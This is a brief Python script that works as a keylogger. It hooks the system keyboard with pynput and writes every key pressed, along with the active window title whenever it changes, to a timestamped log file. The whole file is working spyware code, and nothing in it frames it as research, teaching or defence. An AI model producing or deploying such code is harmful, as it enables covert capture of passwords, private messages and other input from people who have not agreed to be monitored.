from pynput import keyboard
import logging
import os
from config import LOG_FILE
from utils.window_info import get_active_window

current_window = ""

# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    global current_window
    new_window = get_active_window()

    if new_window != current_window:
        current_window = new_window
        logging.info(f"\n[Window: {current_window}]")

    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
